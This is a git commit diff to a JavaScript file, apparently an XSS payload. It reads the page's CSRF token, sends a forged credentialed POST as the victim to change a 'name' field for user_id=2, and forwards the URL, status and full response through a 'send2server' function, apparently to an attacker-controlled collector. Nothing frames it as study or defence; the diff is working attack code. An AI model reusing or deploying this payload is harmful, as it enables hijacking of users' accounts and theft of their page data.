87fc2096c7435bc5c9b6407da8f9e81b4b5a6a3e
Invaders0 <46098959+Invaders0@users.noreply.github.com>
2020-01-19 22:40:56 +0530

    Update new.js

--- new.js
+++ new.js
@@ -5,16 +5,23 @@ function send2server(name, data){
 }
 
 send2server("url", window.location.href);
-
-let xhr = new XMLHttpRequest();
-xhr.open("POST", window.location.pathname, true);
-xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
-xhr.onload = function() { 
-    send2server("status", " "+xhr.status);
-    send2server("response", xhr.response);
-};
-
 send2server("url", window.location.pathname);
 
-xhr.send("name=Nice&user_id=2&_csrf_token="+document.getElementsByName("_csrf_token")[0].value);
+window.addEventListener('load', function () {
+    let xhr = new XMLHttpRequest();
+    xhr.open("POST", window.location.pathname, true);
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+    xhr.withCredntials=true;
+    xhr.onload = function() { 
+        send2server("status", " "+xhr.status);
+        send2server("response", xhr.response);
+    };
+    xhr.onerror = function() {
+        send2server("status", "Network error");
+    };
+    xhr.onprogress = function(event) {
+        send2server("status", "Received " + event.loaded + " of " + event.total);
+    };
+    xhr.send("name=Nice&user_id=2&_csrf_token="+document.getElementsByName("_csrf_token")[0].value);
+});
